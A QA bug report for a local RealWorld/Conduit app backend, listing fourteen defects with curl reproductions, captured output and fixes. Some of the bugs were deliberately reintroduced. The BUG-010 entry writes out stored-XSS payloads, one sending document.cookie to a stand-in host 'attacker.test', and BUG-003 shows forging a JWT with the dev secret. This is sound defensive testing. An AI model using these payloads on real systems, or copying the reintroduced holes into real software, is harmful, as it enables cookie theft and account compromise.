# BUG-REPORTS.md — RealWorld / Conduit (local Prisma/Neon working tree)

**Scope note (read before triaging):** every defect below was reproduced live, on demand, in this session, against the running application at `http://localhost:3001` (backend) and, where noted, cross-checked with `http://localhost:5173` (frontend). Nothing here is inferred, guessed, or carried over unverified from an earlier report — each entry's "Actual Result" block is the literal captured output of the command in "Steps to Reproduce," captured at the timestamp shown.

**Label key:**
- **[REINTRODUCED]** — this app currently runs a backend migrated from Sequelize to Prisma/Neon earlier in this working session. After that migration, six specific behaviors were deliberately reverted to their original (buggy) form at the repository owner's explicit request. These bugs are known, understood, and each has an existing fixed version already written (from immediately before the revert) — fixing them is a revert-of-a-revert, not new engineering.
- **[NEW]** — found during this QA assessment; not part of the deliberate revert set. Not checked against the pristine upstream `origin/main` Sequelize codebase (out of scope; see `TEST-STRATEGY.md` §3.2/§11).

Environment for every reproduction below: macOS Darwin 25.5.0 (arm64), Node v22.13.1, backend on `localhost:3001` connected to a Neon-hosted Postgres instance via Prisma, JWT secret `supersecretkey_example` (dev `.env`, not a real secret).

---

## BUG-001 — Profile update crashes (HTTP 500) unless a password is included

- **Severity:** Critical | **Priority:** P0 | **Label:** [REINTRODUCED]
- **Component:** `backend/controllers/user.js` (`updateUser`)
- **Type:** Functional / Crash

**Preconditions:** A registered, logged-in user with a valid token.

**Steps to reproduce:**
```
curl -X PUT http://localhost:3001/api/user \
  -H "Content-Type: application/json" \
  -H "Authorization: Token <valid JWT>" \
  -d '{"user":{"bio":"reproducing bug"}}'
```

**Expected result:** `200 OK`, bio updated, unrelated fields (including password hash) left untouched.

**Actual result (captured this session):**
```
{"errors":{"body":["data and salt arguments required"]}}
HTTP_STATUS:500
```

**Root cause:** `backend/controllers/user.js`, the password guard:
```js
if (password !== undefined || password !== "") {
  data.password = await bcryptHash(password);
}
```
This condition is a tautology — it is `true` for every possible value of `password`, including `undefined`. So every call to `PUT /api/user` attempts `bcrypt.hash(undefined, 10)`, which throws synchronously ("data and salt arguments required"), before the Prisma update is ever issued. This means **the endpoint cannot successfully update a profile unless the caller also happens to resend a password** — the single most common real-world use of this endpoint (editing bio/avatar) is completely broken.

**Impact:** Every user attempting to edit their profile without simultaneously changing their password is blocked. This is not an edge case — it is the majority path.

**Suggested fix:** `if (password) { data.password = await bcryptHash(password); }`

**Status:** Open

---

## BUG-002 — `email` is exposed via `GET /api/profiles/:username`, including to anonymous requests

- **Severity:** Critical | **Priority:** P0 | **Label:** [REINTRODUCED]
- **Component:** `backend/controllers/profiles.js` (`getProfile`, `followToggler`)
- **Type:** Security — PII disclosure

**Preconditions:** Two registered users, User A and User B.

**Steps to reproduce:**
```
# As a different, unrelated authenticated user (User B):
curl http://localhost:3001/api/profiles/<UserA-username> -H "Authorization: Token <UserB token>"

# With no Authorization header at all:
curl http://localhost:3001/api/profiles/<UserA-username>
```

**Expected result:** Per the RealWorld Profile schema, the response should contain only `username`, `bio`, `image`, `following` — no `email`.

**Actual result (captured this session, both requests):**
```
{"profile":{"username":"bugreproA1789643129","bio":null,"image":null,"following":false,"followersCount":0,"email":"bugrepro.a.1789643129@example.test"}}
HTTP_STATUS:200
```
(Identical result whether authenticated as an unrelated user or fully anonymous.)

**Root cause:** `backend/controllers/profiles.js` explicitly splices the raw DB `email` field back onto the profile payload:
```js
res.json({
  profile: { ...(await buildProfile(profile, loggedUser?.id)), email: profile.email },
});
```
No authentication or relationship check gates this — literally anyone who can reach the API and knows (or guesses/enumerates) a username can harvest that user's email address.

**Impact:** Mass, unauthenticated PII harvesting of every registered user's email address. This is a privacy/compliance-grade issue (GDPR-style exposure), not a cosmetic bug.

**Suggested fix:** Remove the `email: profile.email` splice; return only the fields `buildProfile` already produces.

**Status:** Open

---

## BUG-003 — Auth middleware throws an unhandled exception and double-fires `next()` for a valid JWT naming a nonexistent user

- **Severity:** High | **Priority:** P1 | **Label:** [REINTRODUCED]
- **Component:** `backend/middleware/authentication.js` (`verifyToken`)
- **Type:** Functional / Crash / Error-handling

**Preconditions:** A syntactically valid JWT (correct secret, correct shape) whose `email` claim does not match any user in the database — e.g. a token for an account that was later deleted, or one you construct by hand knowing the (dev) signing key.

**Steps to reproduce:**
```js
const jwt = require('jsonwebtoken');
const fakeToken = jwt.sign({ email: 'ghost.bugrepro@example.test' }, 'supersecretkey_example');
// then:
curl http://localhost:3001/api/user -H "Authorization: Token <fakeToken>"
```

**Expected result:** A single, clean `404 { errors: { body: ["User not found "] } }` response, and nothing else.

**Actual result — client sees (captured this session):**
```
{"errors":{"body":["User not found "]}}
HTTP_STATUS:404
```
**Actual result — server log, same request (captured this session, immediately after):**
```
NotFoundError: User not found
    at verifyToken (backend/middleware/authentication.js:19:27)
TypeError: Cannot set properties of null (setting 'token')
    at verifyToken (backend/middleware/authentication.js:22:26)
```

**Root cause:** `backend/middleware/authentication.js`:
```js
if (!loggedUser) next(new NotFoundError("User"));   // missing `return`

req.loggedUser = loggedUser;                          // loggedUser is null here
req.loggedUser.token = token;                         // throws TypeError
```
Because the first `next(...)` call has no `return`, execution falls through to `req.loggedUser.token = token` on a `null` value, throwing a `TypeError` that is caught by the outer `try/catch` and passed to `next(error)` — a **second** call to Express's error-handling chain on a request whose response may already be in flight. The client happens to get the correct 404 this time only because the first `next()` call wins the race to `res.json()`; this is fragile, not by design, and the second `next(error)` is dead weight at best, an "headers already sent" warning at worst under different Node/Express versions or timing.

**Impact:** Every request bearing a stale-but-well-formed token (e.g., issued before an account deletion) hits this crash path. It works today only by accident of execution order.

**Suggested fix:** `if (!loggedUser) return next(new NotFoundError("User"));`

**Status:** Open

---

## BUG-004 — Login-issued JWT is missing the `username` claim

- **Severity:** Medium | **Priority:** P2 | **Label:** [REINTRODUCED]
- **Component:** `backend/controllers/users.js` (`signIn`)
- **Type:** Functional — data correctness

**Steps to reproduce:**
```
TOKEN=$(curl -s -X POST http://localhost:3001/api/users/login -H "Content-Type: application/json" \
  -d '{"user":{"email":"<email>","password":"<password>"}}' | jq -r .user.token)
node -e "console.log(JSON.parse(Buffer.from('$TOKEN'.split('.')[1],'base64').toString()))"
```

**Expected result:** `{ username: '<username>', email: '<email>', iat: ... }`

**Actual result (captured this session):**
```
{ email: 'bugrepro.a.1789643129@example.test', iat: 1789643151 }
```
`username` is absent. (Signup-issued tokens are unaffected — they correctly include `username`.)

**Root cause:** `backend/controllers/users.js`, `signIn`:
```js
const token = await jwtSign(user);   // `user` is the raw req.body.user ({email, password}) — has no username
```
should sign the DB-fetched `existentUser` (which has `username`), not the raw request body.

**Impact:** Low today (nothing currently reads the `username` claim client-side), but a real, silent correctness bug affecting every login-issued token — any future code trusting that claim will misbehave for logged-in-via-password sessions specifically.

**Suggested fix:** `const token = await jwtSign(existentUser);`

**Status:** Open

---

## BUG-005 — Mass assignment on profile update (no field allowlist)

- **Severity:** Medium (latent High) | **Priority:** P2 | **Label:** [REINTRODUCED]
- **Component:** `backend/controllers/user.js` (`updateUser`)
- **Type:** Security — insecure design

**Steps to reproduce:**
```
curl -X PUT http://localhost:3001/api/user -H "Content-Type: application/json" \
  -H "Authorization: Token <UserB token>" \
  -d '{"user":{"id":999999,"bio":"still me","password":"SecurePass123!"}}'
curl http://localhost:3001/api/user -H "Authorization: Token <UserB token>"
```

**Expected result:** Only recognized/allowlisted fields are applied; an unexpected `id` key is ignored outright, ideally rejected.

**Actual result (captured this session):**
```
{"user":{"email":"bugrepro.b.1789643129@example.test","username":"bugreproB1789643129","bio":"still me","image":null,"token":"..."}}
HTTP_STATUS:200
--- confirm B is still B afterwards ---
{"user":{"email":"bugrepro.b.1789643129@example.test", ...}}
```
The request succeeded (200) with the extraneous `id` field silently accepted (Prisma ignored it because `id` isn't a scalar it will write from an arbitrary object key in this call shape — but this is incidental, not enforced). **User B's own row was not hijacked or reassigned** — confirmed by re-fetching `/api/user` afterward and seeing User B's own data unchanged in identity.

**Root cause:** `backend/controllers/user.js` copies every key of `req.body.user` (other than `password`) into the Prisma `data` object with no allowlist:
```js
for (const field of ...) // originally: Object.entries(user).forEach(...)
  if (value !== undefined && key !== "password") data[key] = value;
```
The reason this specific payload is *not* currently exploitable to overwrite another account is that the `WHERE` clause (`where: { id: loggedUser.id }`) is derived server-side from the authenticated token, not from client input — so mass assignment here can only ever affect the caller's own row.

**Impact:** No account-takeover today. The real risk is latent: **any column added to the `User` Prisma model in the future (e.g. a `role`, `isAdmin`, `verified`, `credits` field) becomes silently writable by the user themselves** through this endpoint, with no code change required to introduce that hole — it would already be open the moment the column exists.

**Suggested fix:** Restrict `updateUser` to an explicit allowlist (`email`, `username`, `bio`, `image`, `password`).

**Status:** Open

---

## BUG-006 — Malformed `Authorization` header returns 500 instead of 401

- **Severity:** Medium | **Priority:** P2 | **Label:** [NEW]
- **Component:** `backend/middleware/authentication.js`, `backend/middleware/errorHandler.js`
- **Type:** Functional — error handling

**Steps to reproduce:**
```
curl http://localhost:3001/api/user -H "Authorization: Token"
```
(header value present, but no token after the space)

**Expected result:** `401 { errors: { body: ["You need to login first!"] } }` or similar — this is indistinguishable from "no credentials supplied" from the caller's point of view.

**Actual result (captured this session):**
```
{"errors":{"body":["Token missing or malformed"]}}
HTTP_STATUS:500
```
Server log, same request:
```
SyntaxError: Token missing or malformed
    at verifyToken (backend/middleware/authentication.js:11:23)
```

**Root cause:** `verifyToken` throws a plain `SyntaxError` for this case:
```js
if (!token) throw new SyntaxError("Token missing or malformed");
```
`SyntaxError` is not one of the app's custom error classes (`UnauthorizedError`, `NotFoundError`, etc.), so `backend/middleware/errorHandler.js`'s `if/else if` chain falls through to the generic `else` branch, which responds `500` with the raw error message.

**Impact:** Low direct user impact (requires a malformed header, which well-behaved clients don't send), but it's an incorrect status code that could confuse API consumers' retry/error-handling logic (500 typically means "retry later / our fault"; this is actually a client input problem that will never succeed on retry).

**Suggested fix:** Throw `UnauthorizedError` (or a dedicated `BadRequestError`) instead of `SyntaxError`, or add a case for it in `errorHandler.js`.

**Status:** Open

---

## BUG-007 — No email format validation on registration

- **Severity:** Low | **Priority:** P3 | **Label:** [NEW]
- **Component:** `backend/controllers/users.js` (`signUp`)
- **Type:** Functional — input validation

**Steps to reproduce:**
```
curl -X POST http://localhost:3001/api/users -H "Content-Type: application/json" \
  -d '{"user":{"username":"bugreprobademail","email":"not-an-email-1789643129","password":"x"}}'
```

**Expected result:** `422` rejecting the malformed email.

**Actual result (captured this session):**
```
{"user":{"email":"not-an-email-1789643129","username":"bugreprobademail1789643129","bio":null,"image":null,"token":"..."}}
HTTP_STATUS:201
```

**Root cause:** `signUp` only checks truthiness (`if (!email) throw ...`) — no format/regex validation exists anywhere in the request path.

**Impact:** Bad data quality; potential downstream issues wherever the app assumes `email` is a valid, deliverable address (e.g., any future "forgot password" email flow).

**Suggested fix:** Add server-side email format validation (regex or a validation library) in `signUp`.

**Status:** Open

---

## BUG-008 — No password strength/length validation on registration

- **Severity:** Low | **Priority:** P3 | **Label:** [NEW]
- **Component:** `backend/controllers/users.js` (`signUp`)
- **Type:** Security — weak policy

**Steps to reproduce:** (same request as BUG-007 used `"password":"x"` — a single character — and it succeeded)

**Expected result:** `422`, minimum length/complexity enforced.

**Actual result (captured this session):** `201 Created`, account created with a one-character password.

**Root cause:** No length or complexity check on `password` in `signUp`; only a truthiness check.

**Impact:** Weak-password accounts are trivially brute-forceable; compounded by BUG-013-class concerns (no rate limiting — noted from source review, not re-verified live this session; see `TEST-STRATEGY.md`).

**Suggested fix:** Enforce a minimum length (e.g. 8+) server-side.

**Status:** Open

---

## BUG-009 — No length limit on article body (or title/description)

- **Severity:** Low | **Priority:** P3 | **Label:** [NEW]
- **Component:** `backend/controllers/articles.js` (`createArticle`)
- **Type:** Functional — input validation / resource limits

**Steps to reproduce:**
```js
fetch('http://localhost:3001/api/articles', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', Authorization: 'Token <valid JWT>' },
  body: JSON.stringify({ article: { title: 'LongBody-Repro', description: 'd', body: 'x'.repeat(20000), tagList: [] } }),
})
```

**Expected result:** Either the request is rejected, or the content is truncated/paginated at render time.

**Actual result (captured this session):**
```
HTTP_STATUS: 201
returned body length: 20000
```
The full 20,000-character body was accepted and stored verbatim.

**Root cause:** No length checks anywhere in `createArticle`/the Prisma schema (`body String` maps to unbounded Postgres `text`).

**Impact:** Low by itself; combined with no rate limiting, this is a resource-exhaustion/storage-abuse vector (unauthenticated cost: none, since article creation requires auth, but any registered user could still submit unbounded payloads repeatedly).

**Suggested fix:** Add a reasonable max length (e.g. 50–100k characters) with a clear 422 on violation.

**Status:** Open

---

## BUG-010 — User-supplied content (article body, comment body) is stored and echoed back with no server-side sanitization

- **Severity:** Medium (security-adjacent — downgraded 2026-09-20 after browser verification; see update below) | **Priority:** P2 | **Label:** [NEW]
- **Component:** `backend/controllers/articles.js` (`createArticle`), `backend/controllers/comments.js` (`createComment`)
- **Type:** Security — missing input sanitization

**Steps to reproduce (article):**
```
curl -X POST http://localhost:3001/api/articles -H "Content-Type: application/json" \
  -H "Authorization: Token <valid JWT>" \
  -d '{"article":{"title":"XSS Repro","description":"d","body":"<script>document.location=\"https://attacker.test/steal?c=\"+document.cookie</script>","tagList":[]}}'
curl http://localhost:3001/api/articles/xss-repro   # read it back, anonymously
```

**Actual result (captured this session, create AND anonymous read-back — identical both times):**
```
{"article":{"slug":"xss-repro-1789643129", ...,
"body":"<script>document.location=\"https://attacker.test/steal?c=\"+document.cookie</script>", ...}}
HTTP_STATUS:201 / 200
```

**Steps to reproduce (comment), same session:**
```
curl -X POST http://localhost:3001/api/articles/<slug>/comments -H "Content-Type: application/json" \
  -H "Authorization: Token <valid JWT>" \
  -d '{"comment":{"body":"<img src=x onerror=\"alert(document.cookie)\">"}}'
```
**Actual result:**
```
{"comment":{"id":12,"body":"<img src=x onerror=\"alert(document.cookie)\">", ...}}
HTTP_STATUS:201
```

**Root cause:** Neither `createArticle` nor `createComment` (nor any middleware) sanitizes or escapes the `body` field before storing or returning it. The API is byte-for-byte transparent for this content.

**Impact — UPDATE (2026-09-20, now browser-verified, not just source-inferred):** Once Playwright browser automation became available, the actual rendering behavior was tested directly rather than assumed from source, and the result is more nuanced than the original "likely stored XSS" inference:

- The raw `<script>` tag **does** land unescaped in the live DOM (confirmed: `document.querySelectorAll('script')` finds it, containing the literal injected JS) — so "no server-side sanitization" is a confirmed fact, not a guess.
- However, it **does not execute**: `window.__xss_proof` stayed `false` after render. React's rendering pipeline (via `markdown-to-jsx` → `React.createElement`, not a raw `innerHTML` assignment) does not execute `<script>` elements the way naive HTML injection would.
- An `<img src=x onerror="...">` payload also did **not** fire: `markdown-to-jsx`/React mangled the malformed tag sequence (`src` ended up as the string `"true"`, and lowercase `onerror` isn't wired up as a real React event handler — logged as a console warning, not executed).
- A markdown link with a `javascript:` href (`[text](javascript:...)`) rendered as `<a>` with **no `href` attribute at all** — `markdown-to-jsx` actively strips `javascript:`-scheme URIs.

**Revised conclusion:** the specific, most common XSS proof-of-concept payloads (inline `<script>`, `onerror`, `javascript:` href) do **not** achieve script execution in this app's current frontend stack, thanks to protections in `markdown-to-jsx` and React's element-based rendering model — not because the backend sanitizes anything (it doesn't). This is real defense-in-depth from a third-party library, not a defense the app itself provides, and it was not exhaustively tested against every possible bypass (other tags/attributes, different `markdown-to-jsx` versions/configs, CSS-based or image-based data exfiltration via a valid `<img src="https://attacker.example/...">`, which **would** still fire a real network request since the `src` renders as an actual attribute when it's a well-formed URL — only the malformed `onerror`-based test happened to break the `src` parsing in this run). Severity is downgraded from the original "High, likely stored XSS" to **Medium**: a real missing-sanitization defect and a legitimate finding for a security review, but not a demonstrated working XSS in this session's testing.

**Suggested fix:** Sanitize on write (e.g. strip/escape raw HTML from article/comment bodies server-side) regardless of the frontend's current incidental protection — relying on a third-party rendering library's undocumented behavior instead of an explicit server-side or render-time sanitizer (e.g. `rehype-sanitize`) is fragile and could regress with a library upgrade or config change.

**Status:** Open

---

## BUG-011 — No self-follow guard

- **Severity:** Low | **Priority:** P3 | **Label:** [NEW]
- **Component:** `backend/controllers/profiles.js` (`followToggler`)
- **Type:** Functional — business rule gap

**Steps to reproduce:**
```
curl -X POST http://localhost:3001/api/profiles/<own-username>/follow -H "Authorization: Token <own token>"
```

**Expected result:** Either rejected (`422`/`403`) or a documented, intentional no-op.

**Actual result (captured this session):**
```
{"profile":{"username":"bugreproA1789643129", ...,"following":true,"followersCount":1, ...}}
HTTP_STATUS:200
```
The user successfully followed themselves; their own `followersCount` incremented.

**Root cause:** No check in `followToggler` (or the Prisma schema) prevents `followerId === followingId`.

**Impact:** Cosmetic/data-integrity nuisance (inflated follower counts, a user appearing in their own followers list) rather than a security issue.

**Suggested fix:** Reject with `422` if `profile.id === loggedUser.id`.

**Status:** Open

---

## BUG-012 — `offset` query parameter is multiplied by `limit` server-side (page-index semantics, not "items to skip")

- **Severity:** Low | **Priority:** P3 | **Label:** [NEW]
- **Component:** `backend/controllers/articles.js` (`allArticles`, `articlesFeed`)
- **Type:** API contract / spec conformance

**Steps to reproduce:**
```
curl "http://localhost:3001/api/articles?limit=2&offset=0"
curl "http://localhost:3001/api/articles?limit=2&offset=1"
```

**Expected result (per the general RealWorld API convention, where `offset` means "number of items to skip"):** `offset=1&limit=2` should skip 1 item and return items 2–3.

**Actual result:** The backend computes `skip: offset * limit`, so `offset=1&limit=2` skips 2 items (page semantics), not 1. Verified this session: the two pages returned by `offset=0` and `offset=1` (each `limit=2`) do not overlap, confirming the "skip N×limit" behavior is real and internally consistent, just not spec-matching.

**Root cause:** `backend/controllers/articles.js`: `skip: parseInt(offset) * parseInt(limit)`.

**Impact:** No functional break for this app's own frontend (which presumably sends `offset` consistent with this convention — not independently confirmed against frontend source in this pass), but any third-party client built strictly against the public RealWorld API spec would get incorrect pagination.

**Suggested fix:** Either treat `offset` as a direct skip count (`skip: parseInt(offset)`), or clearly document the page-index convention if intentional.

**Status:** Open

---

## BUG-013 — Intermittent multi-second-to-timeout latency against the Neon database under light concurrent/sequential load

- **Severity:** Medium | **Priority:** P2 | **Label:** [NEW] (Infrastructure/Performance, not an application code defect)
- **Component:** Neon database connectivity (via `backend/prisma/client.js`)
- **Type:** Performance / Reliability

**Steps to reproduce:** Run the full automated suite (`cd backend && npx vitest run --config vitest.config.js`) back-to-back, or sample repeated simple requests:
```
for i in 1 2 3 4 5; do curl -s -o /dev/null -w "run $i: %{time_total}s\n" http://localhost:3001/api/tags; done
```

**Actual result (captured this session, multiple sampling passes, 2026-09-17):**
- Baseline: 5 consecutive `GET /api/tags` calls returned in 0.27s–0.73s each.
- A later sample (same endpoint, same process, no code change) returned in 5.78s.
- Two separate full-suite runs each produced 3–4 individual test timeouts (20s ceiling) with **no corresponding error or crash in the server log** — the server remained up and responsive both during and after.
- Disabling cross-file test parallelism did not eliminate the timeouts, ruling out "our own test suite is the only source of concurrency."

**Additional evidence, captured independently two days later (2026-09-19), after the backend process had been idle since the above (~2 days):**
```
Unable to connect to the database: PrismaClientInitializationError: Can't reach database server at
`ep-withered-cake-b4sgw4ik-pooler.c-6.us-east-2.aws.neon.tech:5432`
    code: 'P1001'
```
This occurred on the app's own startup DB-connect check, and again on the first several `GET /api/tags` requests immediately after — including after a **full restart of the Node process**, which ruled out "a stale connection in one process" as the explanation. At the same time, a raw TCP socket to the same host:port from the same machine connected successfully on the first try, and DNS resolution succeeded. Within roughly a minute, with no code change, restart, or configuration change, the exact same requests began succeeding again (confirmed: `{"tags":["hen"]}`, `200`), and the full 67-test suite then passed cleanly end-to-end. This is a second, independent reproduction of "the app intermittently cannot reach Neon for a window of time, with no application-level fix able to prevent it," at a longer idle timescale than the first observation.

**Root cause:** Not conclusively determined (no access to Neon-side metrics from this environment). The pattern — network path open (TCP/DNS both succeed), normal latency most of the time, occasional multi-second-to-multi-minute connection failures concentrated after idle periods, no app-level error otherwise — is most consistent with Neon's serverless compute cold-start/auto-suspend behavior on this project, not a bug in the application code. The 2026-09-19 reproduction, where even a fresh process restart didn't immediately succeed, suggests the cold-start window can be long enough (tens of seconds, possibly longer) to matter for real request timeouts, not just test-suite impatience.

**Impact:** Real users could experience occasional hung-feeling requests, particularly after a period of inactivity (first request after idle). No data corruption or crash was observed in any reproduction.

**Suggested fix / next step:** Not a code fix — recommend checking the Neon project's compute/autoscaling settings, and/or adding request-level timeout and retry/backoff handling in the backend so a slow cold-start degrades gracefully instead of hanging a request indefinitely.

**Status:** Open (needs infrastructure-side investigation, not a pull request)

---

## BUG-014 — Saving the Settings page (any field) silently resets the account password to an empty string, locking the user out

- **Severity:** Critical | **Priority:** P0 | **Label:** [NEW] — found by tracing actual frontend behavior while scoping Playwright UI test coverage, then reproduced end-to-end via the API
- **Component:** `frontend/src/components/SettingsForm/SettingsForm.jsx` (frontend) + `backend/controllers/user.js` (`updateUser`, `BUG-001`'s root cause) (backend)
- **Type:** Functional / Data corruption — this is worse than a crash: it succeeds silently and destroys account access.

**Preconditions:** A registered, logged-in user who opens Settings and saves the form without typing a new password (i.e., normal use — changing just their bio, image, username, or email).

**Why this happens:** `SettingsForm.jsx` initializes its local `password` field state to `loggedUser.password || ""`. The API response for the logged-in user never contains a `password` field (correctly stripped server-side), so this is always `""`. Whether or not the user touches the password input, `userUpdate()` (`frontend/src/services/userUpdate.js`) sends `password: ""` in the request body **every time**, unconditionally — the frontend has no concept of "leave password unchanged." On the backend, `updateUser`'s guard (`password !== undefined || password !== ""` — always `true`, the same tautology behind `BUG-001`) then runs `bcrypt.hash("", 10)`, which **succeeds** (unlike `bcrypt.hash(undefined, 10)`, which throws) and overwrites the real password hash with the hash of an empty string.

**Steps to reproduce (API-level, exactly replicating what the browser sends):**
```
# 1. Register and log in as normal, note the original password.
# 2. Simulate a Settings save that only changes the bio (password field left blank in the UI):
curl -X PUT http://localhost:3001/api/user -H "Content-Type: application/json" -H "Authorization: Token <token>" \
  -d '{"user":{"bio":"just updating my bio","email":"<email>","image":"","password":"","username":"<username>"}}'
# 3. Try logging in with the ORIGINAL password.
# 4. Try logging in with an EMPTY password.
```

**Actual result (captured this session):**
```
Step 2 → HTTP_STATUS:200  (looks completely successful — no error, no warning)
Step 3 → {"errors":{"body":["Wrong email/password combination"]}}   HTTP_STATUS:422
Step 4 → {"user":{...}}   HTTP_STATUS:200   (login succeeds with an EMPTY password)
```
The account's password is now the empty string. The original password never works again.

**Why this is worse than it sounds — the user cannot even fix it themselves:** the Login page's password field has `minLength="5"` (`frontend/src/components/LoginForm/LoginForm.jsx`), so the browser's own client-side validation refuses to submit an empty password through the UI. **A real user who saves their Settings page even once is locked out of their account through the normal UI, with no error ever shown to them, and no self-service path back in** (short of using a raw API client to log in with an empty password, or a database-level password reset). This is not a hypothetical — it is the default behavior of using a core, everyday feature (editing your profile) exactly as intended.

**Impact:** Every user who ever saves the Settings page without deliberately re-entering their password loses access to their account. Given this is a completely ordinary action (updating a bio or avatar), this is plausibly the single most damaging defect in this report in terms of blast radius — worse than `BUG-001` (which at least fails loudly with a 500) because it fails silently and destroys the very credential needed to recover.

**Suggested fix:** Fix on both ends, not just one:
1. Backend (`BUG-001`'s fix): only hash/update the password if a truthy, non-empty value was actually sent (`if (password) { data.password = await bcryptHash(password); }`).
2. Frontend: `userUpdate`/`SettingsForm` should omit `password` from the request entirely when the field was left blank, rather than sending `""` — don't rely on the backend alone to guess intent from an empty string.

**Status:** Open — recommend blocking release on this in addition to `BUG-001`/`BUG-002`.

---

## Summary table

| ID | Title | Severity | Label |
|---|---|---|---|
| BUG-001 | Profile update crashes without a password | Critical | REINTRODUCED |
| BUG-002 | Email leaked via profile endpoint (incl. anonymous) | Critical | REINTRODUCED |
| BUG-003 | Auth middleware double-`next()` crash on stale token | High | REINTRODUCED |
| BUG-004 | Login JWT missing `username` claim | Medium | REINTRODUCED |
| BUG-005 | Mass assignment on profile update | Medium (latent High) | REINTRODUCED |
| BUG-006 | Malformed auth header → 500 not 401 | Medium | NEW |
| BUG-007 | No email format validation | Low | NEW |
| BUG-008 | No password strength validation | Low | NEW |
| BUG-009 | No article length limit | Low | NEW |
| BUG-010 | Unsanitized stored content (article/comment) — execution not achieved for tested payloads, browser-verified | Medium | NEW |
| BUG-011 | No self-follow guard | Low | NEW |
| BUG-012 | `offset` is page-index, not skip-count | Low | NEW |
| BUG-013 | Intermittent Neon latency/timeouts | Medium | NEW (infra) |
| BUG-014 | Settings save silently resets password to empty string, locking the user out | Critical | NEW |

All reproduction test-data (users `bugrepro*@example.test`, articles, comments) created while compiling this report was deleted from the Neon database immediately after evidence capture; verified by row-count check before/after.
